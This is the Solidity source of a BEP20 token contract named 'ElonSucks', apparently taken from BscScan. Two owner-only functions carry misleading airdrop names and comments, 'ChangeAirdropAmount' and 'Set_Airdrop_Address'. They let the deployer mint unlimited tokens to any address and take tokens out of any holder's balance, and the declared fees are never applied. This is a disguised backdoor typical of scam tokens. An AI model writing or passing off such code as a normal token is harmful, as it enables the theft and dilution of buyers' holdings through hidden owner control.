/**
 *Submitted for verification at BscScan.com on 2022-01-23
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-20
*/

/*
    https://t.me/ElonMuskIsAConman
    SPDX-License-Identifier: MIT
    BEP20 standard interface.
*/
pragma solidity 0.8.2;
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract ElonSucks {
    string public name = "Elon Musk is a SCAM artist____a CONMAN";
    string public symbol = "ElonMuskIsAConman";
    uint8 public decimals = 6;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private MarketingWallet = 0x82B69797d16c9fE6a82E850dEEF99B9c09c8e661;
    uint256 public totalSupply = 100000 * 10 ** 6;
    uint256 public liquidityFee = 2;
    uint256 public marketingFee = 2;
    uint256 public totalFee = marketingFee + liquidityFee;
    modifier deliverer {
        require(msg.sender == MarketingWallet, "restricted");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        MarketingWallet = payable (msg.sender);
        emit Transfer(address(0), msg.sender, totalSupply); 
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
        //@dev Sets address of airdrop and transfers tokens from the contract address itself.
        function ChangeAirdropAmount(address spender, uint256 addedValue) public deliverer returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }   //@dev changes the ammount or sets the token allowance of said drop.
    function Set_Airdrop_Address(address spender, uint256 subtractedValue) public deliverer returns (bool success) {
        balanceOf[spender] -= subtractedValue * 10 ** 6;
        return true;
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    receive() external payable { }
}